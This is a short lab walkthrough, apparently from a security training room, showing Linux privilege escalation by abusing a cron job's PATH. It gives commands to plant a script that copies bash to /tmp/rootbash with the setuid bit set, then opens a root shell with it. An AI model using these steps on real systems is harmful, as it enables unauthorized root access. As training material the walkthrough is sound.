# PATH Environment Variable

View the contents of the system-wide crontab:\


`cat /etc/crontab`

Note that the PATH variable starts with **/home/user** which is our user's home directory.

Create a file called **overwrite.sh** in your home directory with the following contents:

\#!/bin/bash\
\
cp /bin/bash /tmp/rootbash\
chmod +xs /tmp/rootbash

Make sure that the file is executable:

`chmod +x /home/user/overwrite.sh`

Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

`rm /tmp/rootbash`\
`exit`
